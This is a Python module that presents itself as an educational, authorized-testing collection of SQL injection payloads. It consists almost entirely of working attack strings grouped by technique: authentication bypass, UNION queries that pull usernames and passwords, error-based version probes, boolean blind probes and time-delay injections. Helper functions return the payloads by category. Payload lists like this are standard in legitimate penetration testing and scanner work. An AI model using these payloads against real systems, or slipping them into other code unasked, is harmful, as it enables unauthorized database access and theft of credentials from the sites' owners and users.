"""
SQL Injection Payloads Module
Educational and Authorized Testing Only
Contains common SQL injection payloads for ethical security testing
"""

# Core SQL injection payloads for educational testing
SQL_PAYLOADS = [
    # Basic authentication bypass payloads
    "' OR '1'='1",
    "\" OR \"1\"=\"1", 
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "\" OR 1=1#",
    
    # Union-based payloads for data extraction testing
    "' UNION SELECT NULL--",
    "\" UNION SELECT NULL--",
    "' UNION SELECT 1--",
    "\" UNION SELECT 1--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    
    # Error-based payloads for database detection
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # Boolean-based blind SQL injection
    "' AND 1=1--",
    "' AND 1=2--",
    "\" AND 1=1--",
    "\" AND 1=2--",
    
    # Time-based payloads for blind testing
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT pg_sleep(5)--",
    
    # Comment variations
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1\" /*",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1\" #",
    
    # URL encoded variations
    "%27%20OR%201=1--",
    "%22%20OR%201=1--",
    
    # Advanced payloads for comprehensive testing
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR 1=1 IN BOOLEAN MODE--",
    "' OR 1=1;--",
    "' OR 1=1;--",
]

# Payload categories for organized testing
PAYLOAD_CATEGORIES = {
    "basic": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1", 
        "' OR 1=1--",
        "\" OR 1=1--"
    ],
    "union": [
        "' UNION SELECT NULL--",
        "\" UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "\" UNION SELECT 1--"
    ],
    "error": [
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
    ],
    "boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "\" AND 1=1--",
        "\" AND 1=2--"
    ],
    "time": [
        "' AND SLEEP(5)--",
        "\" AND SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--"
    ]
}

def get_payloads(category=None):
    """
    Get payloads by category or all payloads
    
    Args:
        category (str): Category of payloads to return
        
    Returns:
        list: List of payloads for educational testing
    """
    if category and category in PAYLOAD_CATEGORIES:
        return PAYLOAD_CATEGORIES[category]
    return SQL_PAYLOADS

def get_categories():
    """
    Get all available payload categories
    
    Returns:
        list: List of category names
    """
    return list(PAYLOAD_CATEGORIES.keys())
